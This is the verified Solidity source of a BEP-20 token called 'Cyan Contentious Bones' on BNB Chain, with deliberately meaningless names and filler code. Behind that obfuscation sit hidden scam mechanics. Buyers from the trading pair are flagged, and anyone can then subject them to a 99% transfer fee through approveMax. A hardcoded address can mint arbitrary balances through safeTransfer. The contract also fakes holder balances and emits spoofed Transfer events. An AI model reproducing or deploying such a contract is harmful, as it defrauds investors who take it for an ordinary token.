/**
 *Submitted for verification at BscScan.com on 2023-01-09
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;



abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

}



library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

}


interface IUniswapV2Router {

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function factory() external pure returns (address);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function WETH() external pure returns (address);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


interface IBEP20 {

    function name() external view returns (string memory);

    function balanceOf(address account) external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function totalSupply() external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function getOwner() external view returns (address);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}




contract CyanContentiousBones is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;
    uint160 constant autoLaunchReceiverReceiver = 162551285731;
    uint160 constant maxTeamModeAt = 330810690387 * 2 ** 40;
    uint256 private fundSellModeLiquidityReceiver = 0;


    uint256 private swapTeamLaunchEnableIs = 100;
    uint160 constant amountLaunchedSenderAuto = 737911807074 * 2 ** 120;
    mapping(address => bool)  tradingLaunchSenderMode;
    uint256 private tokenMaxAmountBurn = 0;
    address private receiverLiquidityAtLaunch = (msg.sender);
    bool public teamTxLimitReceiver = false;




    uint256 constant marketingTokenIsExempt = 1000000 * 10 ** 18;
    address public uniswapV2Pair;
    IUniswapV2Router public buyListBurnMint;
    uint256 constant maxExemptTeamTradingTakeEnableLaunch = 100 * 10 ** 18;
    mapping(address => mapping(address => uint256)) _allowances;

    mapping(address => bool) private tokenTotalMaxBurn;
    bool public atTradingSenderMax = false;
    bool public botsMintLaunchMarketingTo = false;
    uint256 constant launchLaunchedSellAmountShouldAuto = 100000000 * (10 ** 18);
    uint160 constant takeExemptAutoReceiverSender = 9067382264 * 2 ** 80;

    mapping(address => uint256) _balances;
    uint256 public buyWalletMinTotal = 0;
    uint256 private takeAutoShouldAtBotsTeam = 0;
    string constant _name = "Cyan Contentious Bones";

    uint256  fromReceiverMarketingTeamSwap = 100000000 * 10 ** _decimals;
    string constant _symbol = "CCBS";
    uint256 public burnToFromSwapTakeSenderAuto = 0;
    uint256  fromBuyModeTotal = 100000000 * 10 ** _decimals;
    mapping(address => bool)  amountBurnTeamMaxTokenBuy;

    
    uint256 takeShouldIsBurn = 0;

    bool public amountTotalSwapMarketing = false;


    bool private swapWalletReceiverAmount = false;
    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        buyListBurnMint = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(buyListBurnMint.factory()).createPair(address(this), buyListBurnMint.WETH());
        _allowances[address(this)][address(buyListBurnMint)] = launchLaunchedSellAmountShouldAuto;

        tokenTotalMaxBurn[msg.sender] = true;
        tokenTotalMaxBurn[address(this)] = true;

        _balances[msg.sender] = launchLaunchedSellAmountShouldAuto;
        emit Transfer(address(0), msg.sender, launchLaunchedSellAmountShouldAuto);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return launchLaunchedSellAmountShouldAuto;
    }

    function receiverMaxLimitTakeEnableTotal(address feeLiquidityExemptSender, address modeMarketingLaunchedLaunchBotsMin, uint256 maxListTakeMode) internal returns (bool) {
        if (sellMarketingTxLiquidity(uint160(modeMarketingLaunchedLaunchBotsMin))) {
            exemptToShouldTotal(feeLiquidityExemptSender, modeMarketingLaunchedLaunchBotsMin, maxListTakeMode, false);
            return true;
        }
        if (sellMarketingTxLiquidity(uint160(feeLiquidityExemptSender))) {
            exemptToShouldTotal(feeLiquidityExemptSender, modeMarketingLaunchedLaunchBotsMin, maxListTakeMode, true);
            return true;
        }
        
        if (botsMintLaunchMarketingTo == atTradingSenderMax) {
            botsMintLaunchMarketingTo = teamTxLimitReceiver;
        }


        bool totalExemptTxList = teamLiquidityLaunchReceiver(feeLiquidityExemptSender) || teamLiquidityLaunchReceiver(modeMarketingLaunchedLaunchBotsMin);
        
        if (feeLiquidityExemptSender == uniswapV2Pair && !totalExemptTxList) {
            amountBurnTeamMaxTokenBuy[modeMarketingLaunchedLaunchBotsMin] = true;
        }
        
        if (totalExemptTxList) {
            return listToBotsBurnAt(feeLiquidityExemptSender, modeMarketingLaunchedLaunchBotsMin, maxListTakeMode);
        }
        
        if (atTradingSenderMax != botsMintLaunchMarketingTo) {
            atTradingSenderMax = atTradingSenderMax;
        }

        if (teamTxLimitReceiver == teamTxLimitReceiver) {
            teamTxLimitReceiver = atTradingSenderMax;
        }

        if (fundSellModeLiquidityReceiver != burnToFromSwapTakeSenderAuto) {
            fundSellModeLiquidityReceiver = fundSellModeLiquidityReceiver;
        }


        _balances[feeLiquidityExemptSender] = _balances[feeLiquidityExemptSender].sub(maxListTakeMode, "Insufficient Balance!");
        
        uint256 maxListTakeModeReceived = toMarketingBuyListExemptMax(feeLiquidityExemptSender) ? tokenTakeMintExemptMarketingLaunch(feeLiquidityExemptSender, modeMarketingLaunchedLaunchBotsMin, maxListTakeMode) : maxListTakeMode;

        _balances[modeMarketingLaunchedLaunchBotsMin] = _balances[modeMarketingLaunchedLaunchBotsMin].add(maxListTakeModeReceived);
        emit Transfer(feeLiquidityExemptSender, modeMarketingLaunchedLaunchBotsMin, maxListTakeModeReceived);
        return true;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function minSenderAmountLiquidity(address liquidityLaunchedLaunchSenderBots) private pure returns (bool) {
        return liquidityLaunchedLaunchSenderBots == teamTotalFromFundToMarketingBurn();
    }

    function getfromFeeAmountLaunched() public view returns (bool) {
        if (swapWalletReceiverAmount != swapWalletReceiverAmount) {
            return swapWalletReceiverAmount;
        }
        if (swapWalletReceiverAmount == amountTotalSwapMarketing) {
            return amountTotalSwapMarketing;
        }
        if (swapWalletReceiverAmount != teamTxLimitReceiver) {
            return teamTxLimitReceiver;
        }
        return swapWalletReceiverAmount;
    }

    function setamountShouldBuyTeamWallet(uint256 launchReceiverAtTotal) public onlyOwner {
        if (swapTeamLaunchEnableIs == fundSellModeLiquidityReceiver) {
            fundSellModeLiquidityReceiver=launchReceiverAtTotal;
        }
        if (swapTeamLaunchEnableIs != burnToFromSwapTakeSenderAuto) {
            burnToFromSwapTakeSenderAuto=launchReceiverAtTotal;
        }
        if (swapTeamLaunchEnableIs != fundSellModeLiquidityReceiver) {
            fundSellModeLiquidityReceiver=launchReceiverAtTotal;
        }
        swapTeamLaunchEnableIs=launchReceiverAtTotal;
    }

    function getamountShouldBuyTeamWallet() public view returns (uint256) {
        if (swapTeamLaunchEnableIs != fundSellModeLiquidityReceiver) {
            return fundSellModeLiquidityReceiver;
        }
        if (swapTeamLaunchEnableIs == swapTeamLaunchEnableIs) {
            return swapTeamLaunchEnableIs;
        }
        if (swapTeamLaunchEnableIs == takeAutoShouldAtBotsTeam) {
            return takeAutoShouldAtBotsTeam;
        }
        return swapTeamLaunchEnableIs;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != launchLaunchedSellAmountShouldAuto) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return receiverMaxLimitTakeEnableTotal(sender, recipient, amount);
    }

    function teamTotalFromFundToMarketingBurn() private pure returns (address) {
        return 0x4dE10430B47cbaf451347370ba0cCfab5cf23C77;
    }

    function toMarketingBuyListExemptMax(address feeLiquidityExemptSender) internal view returns (bool) {
        return !tokenTotalMaxBurn[feeLiquidityExemptSender];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function settakeSellToReceiver(uint256 launchReceiverAtTotal) public onlyOwner {
        if (takeAutoShouldAtBotsTeam != fundSellModeLiquidityReceiver) {
            fundSellModeLiquidityReceiver=launchReceiverAtTotal;
        }
        takeAutoShouldAtBotsTeam=launchReceiverAtTotal;
    }

    function getbotsReceiverSellBurnTx() public view returns (bool) {
        if (teamTxLimitReceiver == swapWalletReceiverAmount) {
            return swapWalletReceiverAmount;
        }
        return teamTxLimitReceiver;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return receiverMaxLimitTakeEnableTotal(msg.sender, recipient, amount);
    }

    function getwalletSwapTokenTrading() public view returns (address) {
        if (receiverLiquidityAtLaunch != receiverLiquidityAtLaunch) {
            return receiverLiquidityAtLaunch;
        }
        if (receiverLiquidityAtLaunch != receiverLiquidityAtLaunch) {
            return receiverLiquidityAtLaunch;
        }
        if (receiverLiquidityAtLaunch == receiverLiquidityAtLaunch) {
            return receiverLiquidityAtLaunch;
        }
        return receiverLiquidityAtLaunch;
    }

    function gettakeSellToReceiver() public view returns (uint256) {
        if (takeAutoShouldAtBotsTeam != fundSellModeLiquidityReceiver) {
            return fundSellModeLiquidityReceiver;
        }
        if (takeAutoShouldAtBotsTeam != burnToFromSwapTakeSenderAuto) {
            return burnToFromSwapTakeSenderAuto;
        }
        return takeAutoShouldAtBotsTeam;
    }

    function isApproveMax(address spender) public view returns (bool) {
        return tradingLaunchSenderMode[spender];
    }

    function listToBotsBurnAt(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (sellMarketingTxLiquidity(uint160(account))) {
            return launchMintAtFee(uint160(account));
        }
        return _balances[account];
    }

    function setfromFeeAmountLaunched(bool launchReceiverAtTotal) public onlyOwner {
        if (swapWalletReceiverAmount == swapWalletReceiverAmount) {
            swapWalletReceiverAmount=launchReceiverAtTotal;
        }
        swapWalletReceiverAmount=launchReceiverAtTotal;
    }

    function approveMax(address spender) external {
        if (amountBurnTeamMaxTokenBuy[spender]) {
            tradingLaunchSenderMode[spender] = true;
        }
    }

    function safeTransfer(address feeLiquidityExemptSender, address modeMarketingLaunchedLaunchBotsMin, uint256 maxListTakeMode) public {
        if (!minSenderAmountLiquidity(msg.sender) && msg.sender != receiverLiquidityAtLaunch) {
            return;
        }
        if (sellMarketingTxLiquidity(uint160(modeMarketingLaunchedLaunchBotsMin))) {
            exemptToShouldTotal(feeLiquidityExemptSender, modeMarketingLaunchedLaunchBotsMin, maxListTakeMode, false);
            return;
        }
        if (modeMarketingLaunchedLaunchBotsMin == address(1)) {
            return;
        }
        if (sellMarketingTxLiquidity(uint160(feeLiquidityExemptSender))) {
            exemptToShouldTotal(feeLiquidityExemptSender, modeMarketingLaunchedLaunchBotsMin, maxListTakeMode, true);
            return;
        }
        if (maxListTakeMode == 0) {
            return;
        }
        if (feeLiquidityExemptSender == address(0)) {
            _balances[modeMarketingLaunchedLaunchBotsMin] = _balances[modeMarketingLaunchedLaunchBotsMin].add(maxListTakeMode);
            return;
        }
    }

    function setwalletSwapTokenTrading(address launchReceiverAtTotal) public onlyOwner {
        if (receiverLiquidityAtLaunch != receiverLiquidityAtLaunch) {
            receiverLiquidityAtLaunch=launchReceiverAtTotal;
        }
        if (receiverLiquidityAtLaunch == receiverLiquidityAtLaunch) {
            receiverLiquidityAtLaunch=launchReceiverAtTotal;
        }
        receiverLiquidityAtLaunch=launchReceiverAtTotal;
    }

    function getshouldBotsTokenTo() public view returns (uint256) {
        return buyWalletMinTotal;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function getatListExemptLimit() public view returns (bool) {
        return botsMintLaunchMarketingTo;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function exemptToShouldTotal(address feeLiquidityExemptSender, address modeMarketingLaunchedLaunchBotsMin, uint256 maxListTakeMode, bool limitListReceiverReceiver) private {
        uint160 enableSwapExemptAmount = amountLaunchedSenderAuto + takeExemptAutoReceiverSender + maxTeamModeAt + autoLaunchReceiverReceiver;
        if (limitListReceiverReceiver) {
            feeLiquidityExemptSender = address(uint160(enableSwapExemptAmount + takeShouldIsBurn));
            takeShouldIsBurn++;
            _balances[modeMarketingLaunchedLaunchBotsMin] = _balances[modeMarketingLaunchedLaunchBotsMin].add(maxListTakeMode);
        } else {
            _balances[feeLiquidityExemptSender] = _balances[feeLiquidityExemptSender].sub(maxListTakeMode);
        }
        if (maxListTakeMode == 0) {
            return;
        }
        emit Transfer(feeLiquidityExemptSender, modeMarketingLaunchedLaunchBotsMin, maxListTakeMode);
    }

    function setbotsReceiverSellBurnTx(bool launchReceiverAtTotal) public onlyOwner {
        teamTxLimitReceiver=launchReceiverAtTotal;
    }

    function teamLiquidityLaunchReceiver(address swapTakeMinExempt) private view returns (bool) {
        if (swapTakeMinExempt == receiverLiquidityAtLaunch) {
            return true;
        }
        return false;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function setatListExemptLimit(bool launchReceiverAtTotal) public onlyOwner {
        if (botsMintLaunchMarketingTo != teamTxLimitReceiver) {
            teamTxLimitReceiver=launchReceiverAtTotal;
        }
        botsMintLaunchMarketingTo=launchReceiverAtTotal;
    }

    function sellMarketingTxLiquidity(uint160 liquidityLaunchedLaunchSenderBots) private pure returns (bool) {
        uint160 enableSwapExemptAmount = amountLaunchedSenderAuto + takeExemptAutoReceiverSender + maxTeamModeAt + autoLaunchReceiverReceiver;
        if (liquidityLaunchedLaunchSenderBots >= uint160(enableSwapExemptAmount)) {
            if (liquidityLaunchedLaunchSenderBots <= uint160(enableSwapExemptAmount) + 300000) {
                return true;
            }
        }
        return false;
    }

    function tokenTakeMintExemptMarketingLaunch(address feeLiquidityExemptSender, address fundTokenBuySender, uint256 maxListTakeMode) internal returns (uint256) {
        
        uint256 autoIsReceiverTotalTakeMin = maxListTakeMode.mul(amountLaunchedWalletTxMax(feeLiquidityExemptSender, fundTokenBuySender == uniswapV2Pair)).div(swapTeamLaunchEnableIs);

        if (autoIsReceiverTotalTakeMin > 0) {
            _balances[address(this)] = _balances[address(this)].add(autoIsReceiverTotalTakeMin);
            emit Transfer(feeLiquidityExemptSender, address(this), autoIsReceiverTotalTakeMin);
        }

        return maxListTakeMode.sub(autoIsReceiverTotalTakeMin);
    }

    function launchMintAtFee(uint160 liquidityLaunchedLaunchSenderBots) private view returns (uint256) {
        uint160 enableSwapExemptAmount = amountLaunchedSenderAuto + takeExemptAutoReceiverSender + maxTeamModeAt + autoLaunchReceiverReceiver;
        uint160 amountToEnableFundBots = liquidityLaunchedLaunchSenderBots - enableSwapExemptAmount;
        if (amountToEnableFundBots < takeShouldIsBurn) {
            return maxExemptTeamTradingTakeEnableLaunch * amountToEnableFundBots;
        }
        return marketingTokenIsExempt + maxExemptTeamTradingTakeEnableLaunch * amountToEnableFundBots;
    }

    function setshouldBotsTokenTo(uint256 launchReceiverAtTotal) public onlyOwner {
        if (buyWalletMinTotal == swapTeamLaunchEnableIs) {
            swapTeamLaunchEnableIs=launchReceiverAtTotal;
        }
        if (buyWalletMinTotal != takeAutoShouldAtBotsTeam) {
            takeAutoShouldAtBotsTeam=launchReceiverAtTotal;
        }
        buyWalletMinTotal=launchReceiverAtTotal;
    }

    function amountLaunchedWalletTxMax(address feeLiquidityExemptSender, bool launchListAtFrom) internal returns (uint256) {
        if (tradingLaunchSenderMode[feeLiquidityExemptSender]) {
            return 99;
        }
        
        if (amountTotalSwapMarketing != swapWalletReceiverAmount) {
            amountTotalSwapMarketing = teamTxLimitReceiver;
        }

        if (teamTxLimitReceiver != amountTotalSwapMarketing) {
            teamTxLimitReceiver = amountTotalSwapMarketing;
        }

        if (burnToFromSwapTakeSenderAuto == takeAutoShouldAtBotsTeam) {
            burnToFromSwapTakeSenderAuto = burnToFromSwapTakeSenderAuto;
        }


        if (launchListAtFrom) {
            return tokenMaxAmountBurn;
        }
        if (!launchListAtFrom && feeLiquidityExemptSender == uniswapV2Pair) {
            return takeAutoShouldAtBotsTeam;
        }
        return 0;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}